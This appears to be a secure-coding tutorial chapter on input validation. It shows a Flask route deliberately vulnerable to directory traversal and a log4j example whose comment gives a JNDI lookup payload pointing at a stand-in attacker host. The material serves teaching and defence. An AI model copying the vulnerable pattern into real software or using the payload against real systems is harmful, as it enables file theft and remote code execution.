# Goals of Input Validation

Input validation is a critical aspect of software security that aims to prevent malicious data from being processed within a system. This process ensures that only properly formatted data is accepted and entered into the workflow, thereby avoiding the possibility of malformed data being stored in the database and causing downstream components to malfunction.

Input validation is typically performed as soon as data is received from external sources or users, and it should not be relied upon as the primary method of protection against attacks such as Cross-Site Scripting (XSS) or SQL Injection. However, it can help to minimize the impact of these attacks when properly implemented.

**Input Validation is your first line of defense!**

---

## Input validation strategies

There are three primary strategies for input validation

- Type Checking
- White listing
- Length Checkin
  
These strategies are important because without proper input validation, attackers can inject malicious data into a system and cause security vulnerabilities, such as Local File Inclusion/Directory Traversal attacks.

We will highlight each strategy and give hands-on examples of different attacks if these strategies are not implemented correctly. These examples also give you guidance on how specific input validation strategies would have mitigated the attacks demonstrated.

---

## So, what is user input?

User input refers to data from any source that may not be trusted, including not only web clients but also data from suppliers, partners, vendors, or regulators. It is important to validate this data to ensure its integrity and prevent any potential security risks.

---

## General rule of thumb

The general rule of thumb in input validation is to avoid giving an attacker control over the object that is passed into a function, parser, or operator. This means that user input should not be directly passed into a function, but rather should be validated and sanitized first. For example, in the case of a file operator, an attacker could inject malicious data and cause a directory traversal attack.

So, what exactly does that mean?

#### **example 1**
```python
@app.route("/home", methods=['POST'])
def home():
    filename = request.form['filename']
    if filename == "":
        filename = "default.txt"
    f = open(filename,'r')
    read = f.read()
    return render_template("index.html",read = read)
```

In this example we observe that when the so called "source"

> filename = request.form['filename']

Used in the following ***sink*** or in this case a ***File operator***
>  f = open(filename,'r')

Will lead to a security vulnerability called ***Local file inclusion*** || ***Directory traversal*** attack. This attack was preventable by applying the secure design principles mentioned above. We will dig further into this example and how to mitigate it in the chapter that covers the **white listing** mitigation strategy.

---

#### **example 2**

Even though that at the time of writing the code  ***log4j*** did not direclty impose a great security risk, a lot of trouble could have been prevented by not direcly writing user supplied input directly into the ***log.error()*** function.



```java
import org.apache.log4j.Logger;

import java.io.*;
import java.util.*;

public class log4jExample{

   /* Get actual class name to be printed on */
   static Logger log = Logger.getLogger(log4jExample.class.getName());

   public static void main(String[] args){
      // input could look like:
      // ${jndi:rmi//hackerbox.com:1337/exploit}
      log.error(USER_INPUT_HERE);
   }
}
```

The same principles as mentioned in the **Directory / path traversal** example are applied to this example as wel. Don't give an attacker full control over an **object** that goes into a **sink**. More in depth information about the **Log4J** Vulnerability can be found in the **Sources** Section.

In conclusion, input validation is an essential aspect of software security and should be given the attention it deserves. By using the appropriate validation strategies and following best practices, software systems can be made more secure and better protected against malicious attacks.

---

#### Sources:
[OWASP Cheat sheets](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

[Log4J](https://isc.sans.edu/diary/RCE+in+log4j%2C+Log4Shell%2C+or+how+things+can+get+bad+quickly/28120)
